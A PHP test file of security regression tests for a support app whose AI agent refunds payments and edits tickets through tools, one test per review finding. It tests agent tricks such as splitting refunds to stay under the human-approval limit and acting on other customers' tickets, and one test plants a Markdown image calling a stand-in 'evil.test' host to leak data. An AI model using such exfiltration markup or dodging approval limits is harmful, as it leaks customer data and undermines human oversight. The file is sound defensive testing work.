<?php

namespace Tests\Feature;

use App\Jobs\ResumeAgentRun;
use App\Jobs\TriageTicket;
use App\Livewire\DemoLogin;
use App\Livewire\TicketDetail;
use App\Livewire\TicketList;
use App\Models\AgentAction;
use App\Models\Customer;
use App\Models\Payment;
use App\Models\Ticket;
use App\Models\User;
use App\Services\AgentRunner;
use App\Services\AiBudget;
use App\Services\ApprovalService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Queue;
use InvalidArgumentException;
use Livewire\Livewire;
use Tests\Concerns\FakesAnthropic;
use Tests\TestCase;

/**
 * One test per finding of the security review, each written to fail before its fix.
 */
class SecurityRegressionTest extends TestCase
{
    use FakesAnthropic, RefreshDatabase;

    protected User $admin;

    /** Ticket A: the one the agent conversation is about. */
    protected Ticket $ticketA;

    /** Ticket B: Sam's ticket, from another customer. */
    protected Ticket $ticketB;

    protected User $sam;

    protected function setUp(): void
    {
        parent::setUp();

        $this->admin = User::factory()->create(['role' => 'admin']);
        $this->sam = User::factory()->create(['email' => 'sam@flowly.test']);
        $this->ticketA = Ticket::factory()->for(Customer::factory()->withPayments())->create();
        $this->ticketB = Ticket::factory()->for(Customer::factory()->withPayments())->create(['assignee_id' => $this->sam->id, 'status' => 'open']);
    }

    protected function paymentOf(Ticket $ticket): Payment
    {
        return $ticket->customer->payments()->latest('id')->first();
    }

    protected function refund(string $id, Ticket $ticket, float $amount, ?Payment $payment = null): array
    {
        return $this->toolUse($id, 'IssueRefund', [
            'ticket_id' => $ticket->id, 'payment_id' => ($payment ?? $this->paymentOf($ticket))->id, 'amount' => $amount, 'reason' => 'Requested split.',
        ]);
    }

    // High: a large refund split into small ones skipped approval -------------------------

    public function test_h1_a_refund_split_across_steps_needs_approval_once_the_total_passes_the_limit(): void
    {
        $this->fakeAnthropic([
            [$this->refund('toolu_1', $this->ticketA, 49.67)],
            [$this->refund('toolu_2', $this->ticketA, 49.67)],
            [$this->refund('toolu_3', $this->ticketA, 49.66)],
            [$this->text('Refunded in three parts.')],
        ]);

        app(AgentRunner::class)->converse($this->ticketA, 'Please refund it in three parts.');

        $this->assertSame(4967, $this->ticketA->customer->payments()->sum('refunded_cents'));
        $this->assertSame(1, AgentAction::pending()->count());
    }

    public function test_h1_parallel_refunds_in_one_step_cannot_pass_the_limit_together(): void
    {
        $this->fakeAnthropic([
            [$this->refund('toolu_1', $this->ticketA, 49.67), $this->refund('toolu_2', $this->ticketA, 49.67), $this->refund('toolu_3', $this->ticketA, 49.66)],
            [$this->text('Done.')],
        ]);

        app(AgentRunner::class)->converse($this->ticketA, 'Please refund it in three parts.');

        $this->assertSame(4967, $this->ticketA->customer->payments()->sum('refunded_cents'));
        $this->assertStringContainsString('needs a human', $this->toolResultSent('toolu_2'));
        $this->assertStringContainsString('needs a human', $this->toolResultSent('toolu_3'));
    }

    // High: write tools could act on another ticket ----------------------------------------

    public function test_h2_a_refund_cannot_target_another_ticket(): void
    {
        $this->fakeAnthropic([
            [$this->refund('toolu_1', $this->ticketB, 40)],
            [$this->text('Done.')],
        ]);

        app(AgentRunner::class)->converse($this->ticketA, 'Refund $40 on the other ticket.');

        $this->assertSame(0, (int) $this->ticketB->customer->payments()->sum('refunded_cents'));
        $this->assertSame(0, (int) $this->ticketA->customer->payments()->sum('refunded_cents'));
    }

    public function test_h2_an_update_cannot_close_or_reassign_another_ticket(): void
    {
        $jordan = User::factory()->create(['email' => 'jordan@flowly.test']);

        $this->fakeAnthropic([
            [$this->toolUse('toolu_1', 'UpdateTicket', [
                'ticket_id' => $this->ticketB->id, 'status' => 'closed', 'assignee_email' => 'jordan@flowly.test', 'reason' => 'Mine now.',
            ])],
            [$this->text('Done.')],
        ]);

        app(AgentRunner::class)->converse($this->ticketA, 'Close the other ticket and give it to me.');
        app(ApprovalService::class)->approve(AgentAction::sole(), $jordan);

        $this->ticketB->refresh();
        $this->assertSame('open', $this->ticketB->status);
        $this->assertSame($this->sam->id, $this->ticketB->assignee_id);
        $this->assertSame($this->ticketA->id, AgentAction::sole()->ticket_id);
    }

    public function test_h2_an_approver_cannot_retarget_a_pending_refund_to_another_ticket(): void
    {
        $this->fakeAnthropic([
            [$this->refund('toolu_1', $this->ticketA, 149)],
            [$this->text('Done.')],
        ]);

        app(AgentRunner::class)->converse($this->ticketA, 'Refund the duplicate.');

        $action = AgentAction::sole();

        try {
            app(ApprovalService::class)->approve($action, $this->admin, [
                ...$action->arguments, 'ticket_id' => $this->ticketB->id, 'payment_id' => $this->paymentOf($this->ticketB)->id,
            ]);
        } catch (InvalidArgumentException) {
            //
        }

        $this->assertSame(0, (int) $this->ticketB->customer->payments()->sum('refunded_cents'));
    }

    // Medium: refunds read then wrote without a lock ---------------------------------------

    public function test_m1_a_refund_that_races_another_refund_never_overwrites_it(): void
    {
        config(['triagedesk.refund_auto_approve_limit' => 1000]);
        $payment = $this->paymentOf($this->ticketA);

        // Another refund of $120 lands between this tool reading the payment and writing it.
        $raced = false;
        Payment::retrieved(function (Payment $read) use (&$raced, $payment) {
            if (! $raced && $read->id === $payment->id) {
                $raced = true;
                DB::table('payments')->where('id', $payment->id)->update(['refunded_cents' => 12000]);
            }
        });

        $this->fakeAnthropic([
            [$this->refund('toolu_1', $this->ticketA, 40, $payment)],
            [$this->text('Done.')],
        ]);

        app(AgentRunner::class)->converse($this->ticketA, 'Refund $40.');

        $this->assertSame(12000, $payment->fresh()->refunded_cents);
        $this->assertStringNotContainsString('Refunded $40.00', (string) $this->toolResultSent('toolu_1'));
    }

    // Medium: images in Markdown, no CSP, and unscoped read tools --------------------------

    public function test_m2_agent_markdown_never_loads_an_outside_image(): void
    {
        $this->ticketA->update(['agent_conversation_id' => 'conv-img']);
        DB::table('agent_conversation_messages')->insert([
            'id' => 'msg-img', 'conversation_id' => 'conv-img', 'agent' => 'App\\Ai\\Agents\\SupportAgent', 'role' => 'assistant',
            'content' => 'See ![chart](https://evil.test/collect?d=secret) and <img src="https://evil.test/x">',
            'attachments' => '[]', 'steps' => '[]', 'usage' => '[]', 'meta' => '[]', 'status' => 'completed',
            'created_at' => now(), 'updated_at' => now(),
        ]);

        $this->actingAs($this->admin)
            ->get('/tickets/'.$this->ticketA->id)
            ->assertOk()
            ->assertDontSee('evil.test', false)
            ->assertSee('chart');
    }

    public function test_m2_pages_send_a_content_security_policy(): void
    {
        $policy = $this->actingAs($this->admin)->get('/tickets')->assertOk()->headers->get('Content-Security-Policy');

        $this->assertNotNull($policy);
        $this->assertStringContainsString("img-src 'self' data:", $policy);
        $this->assertStringContainsString("connect-src 'self'", $policy);
        $this->assertStringContainsString("default-src 'self'", $policy);
    }

    public function test_m2_read_tools_only_see_the_current_customer(): void
    {
        $otherEmail = $this->ticketB->customer->email;

        $this->fakeAnthropic([
            [
                $this->toolUse('toolu_1', 'LookupCustomer', ['email' => $otherEmail]),
                $this->toolUse('toolu_2', 'GetTicket', ['ticket_id' => $this->ticketB->id]),
                $this->toolUse('toolu_3', 'SearchTickets', ['customer_email' => $otherEmail]),
            ],
            [$this->text('Done.')],
        ]);

        app(AgentRunner::class)->converse($this->ticketA, 'Look up the other customer.');

        foreach (['toolu_1', 'toolu_2', 'toolu_3'] as $id) {
            $this->assertStringNotContainsString($otherEmail, (string) $this->toolResultSent($id), $id);
        }
    }

    // Medium: re-triage from the ticket list skipped the permission check ------------------

    public function test_m3_a_teammate_cannot_retriage_someone_elses_ticket_from_the_list(): void
    {
        Queue::fake();

        Livewire::actingAs(User::factory()->create())
            ->test(TicketList::class)
            ->call('triage', $this->ticketB->id);

        Queue::assertNotPushed(TriageTicket::class);
    }

    public function test_m3_a_teammate_cannot_triage_someone_elses_ticket_from_its_page(): void
    {
        Queue::fake();
        $this->ticketB->update(['triaged_at' => null]);

        Livewire::actingAs(User::factory()->create())
            ->test(TicketDetail::class, ['ticket' => $this->ticketB])
            ->call('triage');

        Queue::assertNotPushed(TriageTicket::class);
    }

    // Low ----------------------------------------------------------------------------------

    protected function approvedPendingRun(): AgentAction
    {
        $this->fakeAnthropic([
            [$this->refund('toolu_1', $this->ticketA, 149)],
            [$this->text('Refunded.')],
        ]);

        app(AgentRunner::class)->converse($this->ticketA, 'Refund the duplicate.');

        $action = AgentAction::sole();
        $action->update(['status' => AgentAction::APPROVED, 'decided_by' => $this->admin->id, 'decided_at' => now()]);

        return $action;
    }

    public function test_l1_resuming_a_run_respects_the_daily_budget(): void
    {
        $action = $this->approvedPendingRun();

        config(['triagedesk.providers.anthropic.daily_limit_usd' => 0.01]);
        AiBudget::recordCost(10_000, 'anthropic');

        try {
            app(AgentRunner::class)->resume($this->ticketA->fresh(), $action->invocation_id);
        } catch (\RuntimeException) {
            //
        }

        Http::assertSentCount(1);
        $this->assertNull($action->fresh()->submitted_at);
    }

    public function test_l2_two_resumes_of_the_same_run_send_the_decisions_once(): void
    {
        $action = $this->approvedPendingRun();

        // The other worker claims the run right after this one has read it.
        $raced = false;
        AgentAction::retrieved(function () use (&$raced) {
            if (! $raced) {
                $raced = true;
                DB::table('agent_actions')->update(['submitted_at' => now()]);
            }
        });

        app(AgentRunner::class)->resume($this->ticketA->fresh(), $action->invocation_id);

        Http::assertSentCount(1);
    }

    public function test_l3_the_example_env_turns_debug_off(): void
    {
        $this->assertMatchesRegularExpression('/^APP_DEBUG=false$/m', file_get_contents(base_path('.env.example')));
    }

    public function test_l3_password_free_sign_in_needs_demo_mode_outside_local(): void
    {
        config(['triagedesk.demo.enabled' => false]);
        $this->app->detectEnvironment(fn () => 'production');

        try {
            Livewire::test(DemoLogin::class)->call('loginAs', $this->admin->id);
        } catch (\Throwable) {
            //
        }

        $this->assertGuest();
    }

    // Second review -------------------------------------------------------------------------

    public function test_r2_auto_refunds_add_up_per_customer_across_tickets(): void
    {
        [$first, $second] = $this->ticketA->customer->payments()->orderBy('id')->get()->all();
        $otherTicket = Ticket::factory()->for($this->ticketA->customer)->create();

        $this->fakeAnthropic([
            [$this->refund('toolu_1', $this->ticketA, 40, $first)],
            [$this->text('Done.')],
            [$this->refund('toolu_2', $otherTicket, 40, $second)],
            [$this->text('Done.')],
        ]);

        app(AgentRunner::class)->converse($this->ticketA, 'Refund $40.');
        app(AgentRunner::class)->converse($otherTicket, 'Refund $40 on the other payment.');

        $this->assertSame(4000, (int) $this->ticketA->customer->payments()->sum('refunded_cents'));
        $this->assertSame(1, AgentAction::pending()->count());
        $this->assertSame($otherTicket->id, AgentAction::pending()->sole()->ticket_id);
    }

    public function test_r2_auto_refunds_older_than_the_window_no_longer_count(): void
    {
        [$first, $second] = $this->ticketA->customer->payments()->orderBy('id')->get()->all();
        $otherTicket = Ticket::factory()->for($this->ticketA->customer)->create();

        $this->fakeAnthropic([
            [$this->refund('toolu_1', $this->ticketA, 40, $first)],
            [$this->text('Done.')],
            [$this->refund('toolu_2', $otherTicket, 40, $second)],
            [$this->text('Done.')],
        ]);

        app(AgentRunner::class)->converse($this->ticketA, 'Refund $40.');
        $this->travel(31)->days();
        app(AgentRunner::class)->converse($otherTicket, 'Refund $40 on the other payment.');

        $this->assertSame(8000, (int) $this->ticketA->customer->payments()->sum('refunded_cents'));
        $this->assertSame(0, AgentAction::pending()->count());
    }

    public function test_r2_password_free_sign_in_stays_off_in_local_without_demo_mode(): void
    {
        config(['triagedesk.demo.enabled' => false]);
        $this->app->detectEnvironment(fn () => 'local');

        try {
            Livewire::test(DemoLogin::class)->call('loginAs', $this->admin->id);
        } catch (\Throwable) {
            //
        }

        $this->assertGuest();
    }

    public function test_r2_the_example_env_is_production(): void
    {
        $this->assertMatchesRegularExpression('/^APP_ENV=production$/m', file_get_contents(base_path('.env.example')));
    }

    public function test_r2_an_approval_that_cannot_run_for_budget_goes_back_to_pending(): void
    {
        $action = $this->approvedPendingRun();

        // The budget runs out after the approval and before the worker picks the run up.
        config(['triagedesk.providers.anthropic.daily_limit_usd' => 0.01]);
        AiBudget::recordCost(10_000, 'anthropic');

        (new ResumeAgentRun($this->ticketA->fresh(), $action->invocation_id))->handle(app(AgentRunner::class));

        $action->refresh();
        $this->assertSame(AgentAction::PENDING, $action->status);
        $this->assertNull($action->decided_by);
        $this->assertNull($action->submitted_at);
        $this->assertSame(0, (int) $this->ticketA->customer->payments()->sum('refunded_cents'));
        $this->assertStringContainsString('back to pending', (string) $this->ticketA->fresh()->agent_error);
        Http::assertSentCount(1);
    }
}
